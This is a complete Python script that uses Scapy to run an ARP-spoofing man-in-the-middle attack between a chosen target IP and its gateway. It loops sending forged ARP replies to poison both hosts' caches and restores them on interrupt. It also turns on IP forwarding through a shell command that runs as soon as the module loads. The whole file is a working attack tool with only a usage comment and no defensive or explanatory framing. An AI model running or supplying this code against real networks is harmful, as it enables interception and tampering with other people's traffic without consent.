#!/usr/bin/env python3
from scapy.all import *
import time
import sys

def arp_spoof(target_ip, gateway_ip, interface="eth0"):
    """
    ARP spoofing to position as MITM
    """
    # Get MAC addresses
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] Could not resolve MAC addresses")
        return

    print(f"[*] Target: {target_ip} ({target_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print("[*] Starting ARP spoofing...")

    try:
        while True:
            # Tell target we are the gateway
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)

            # Tell gateway we are the target
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)

            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        # Restore original ARP entries
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)

# Enable IP forwarding
import os
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Usage: arp_spoof('192.168.1.10', '192.168.1.1')
